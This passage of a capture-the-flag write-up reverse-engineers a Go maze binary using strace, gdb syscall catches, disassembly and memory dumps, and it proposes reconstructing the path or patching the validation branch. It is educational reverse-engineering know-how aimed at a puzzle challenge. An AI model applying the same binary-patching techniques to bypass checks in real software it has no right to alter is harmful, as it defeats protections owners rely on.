Found 1704-bit binary string inside the ELF:
```python
import re
with open('stage5_elf', 'rb') as f:
    data = f.read()
text = data.decode('latin-1')
matches = re.findall(r'[01]{100,}', text)
# Found 1 match: length=1704
```
Visualized as 24×71 grid — shows diagonal wall pattern from top-right to bottom-left.

---

## Step 10: strace Analysis — KEY DISCOVERY
```bash
strace -e trace=connect,socket,bind ./stage5_elf <<< $'DDDD\nDDDD\n' 2>&1
```
**Result:**
- **NO network connections made** — only SIGURG signals (Go runtime internal)
- Binary is **purely local**, not connecting to `168.144.73.17:8003`
- **THREE inputs confirmed** at end of strace output:
```
Initialize connection...
> Invalid trajectory      ← input 1 (length 4-5)
> Invalid trajectory      ← input 2 (length 4-5)
> Invalid parameter length ← input 3 (empty = wrong length)
> [+] Output:
```

---

# Important Static Addresses Identified
(From this point I took the assistance from ChatGPT for the finding of the further flag: - )

## Sections

```text
.text       : 0x401000 - 0x4a2b51
.rodata     : 0x4a3000 - 0x4d9d62
.data       : 0x587200 - 0x58c972
.bss        : 0x58c980 - 0x5ace58
.noptrbss   : 0x5ace60 - 0x5c2420
```

---

# Key Functions Identified

## Validation / trajectory path

### 0x452a20

Observed after entering:
```text
LUUL
```

Disassembly:

```asm
0x452a20: test %rax,%rax
0x452a23: je 0x452ad7
0x452a29: call 0x4559e0
```

This appears to:
- validate parsed movement structure,
- branch to failure cleanup on invalid path.

---

## 0x41c360

Initially believed to be maze validator.

Later determined:
- heavily reused internally,
- triggered during runtime initialization,
- unsuitable for direct breakpointing.

---

## 0x41c3f7

Observed in stack trace after real user input.

Likely:
- movement parser,
- graph traversal stage,
- or state transition handler.

---

## 0x425e16

Appears in real input-processing stack traces.

Likely:
- higher-level validation dispatcher.

---

# Important Memory Regions

## Transition / movement mask

Address:

```text
0x582820
```

Dump:

```text
0x582820: 00 01 00 00 01 01 00 00
0x582828: 00 00 00 00 00 00 00 00
0x582838: 00 00 00 00 00 01 00 00
0x582840: 01 01 01 01 01 01 00 00
...
```

Interpretation:
- likely directional adjacency mask,
- movement validity table,
- or graph transition bitmap.

---

# Runtime Heap Structures

Several linked runtime-managed structures were explored:

Examples:

```text
0x291cc2d80008
0x291cc2d37008
0x291cc2d80808
```

These appeared to be:
- Go runtime heap descriptors,
- scheduler metadata,
- object containers,
- not actual maze nodes.

Conclusion:
- heap chasing was largely noise.

---

# Important Dynamic Analysis Results

## Catching syscall read

Used:

```gdb
catch syscall read
```

Observed actual input buffer:

```text
"LUUL\n"
```

Important stack trace:

```text
#12 0x43169c
#17 0x425e16
#20 0x41cabe
```

These are likely connected to:
- movement validation,
- graph traversal,
- or parser dispatch.

---

## Catching syscall write

Used:

```gdb
catch syscall write
```

Observed actual output buffer:

```text
"Invalid trajectory\n"
```

Important backtrace:

```text
#12 0x43169c
#22 0x49501b
#30 0x49725f
#33 0x4784c5
```

This confirms:
- failure branch reached,
- validator successfully interceptable.

---

# Key Disassembly

## Around 0x43169c

```asm
0x43169c: mov 0x40(%rsp), %rcx
0x4316a1: mov 0x98(%rcx), %rdx
0x4316a8: cmp %rdx, %rax
0x4316ab: jbe 0x431726
```

This region:
- performs bounds/trajectory comparisons,
- manipulates graph/state values,
- likely participates in path validation.

---

# Major Conclusions

## Confirmed

- Input is parsed into movement instructions.
- Commands are validated against trajectory rules.
- There exists a graph/state transition system.
- Invalid paths explicitly trigger:
  Invalid trajectory
- Command length is validated separately.

---

# Problems Encountered

## Go Runtime Noise

Major difficulty:
- breakpoints triggered continuously inside:
  - scheduler,
  - memory allocator,
  - runtime read/write wrappers.

This caused:
- disappearing input cursor,
- debugger ownership of stdin,
- repeated false-positive breakpoints.

---

# Effective Debugging Techniques Found

## Good

```gdb
catch syscall read
catch syscall write
```

These correctly intercepted:
- real stdin,
- real output generation.

---

## Bad

```gdb
break *0x41c360
```

Triggered excessively during initialization.

---

# Current Best Hypothesis

The intended solution likely involves:

1. reconstructing valid graph traversal,
OR
2. patching/inverting validation branch.

Most promising target regions:

```text
0x41c3f7
0x425e16
0x43169c
0x452a20
```

---

# Suggested Next Steps

## Option 1 — Branch Patching

Identify:

```asm
je invalid
jne invalid
```

near:
- `Invalid trajectory` print path,
- then invert or NOP branch.

---

## Option 2 — Graph Reconstruction

Use:
- movement mask at `0x582820`,
- dynamic state transitions,
- parser stack traces,

to reconstruct valid path.

---
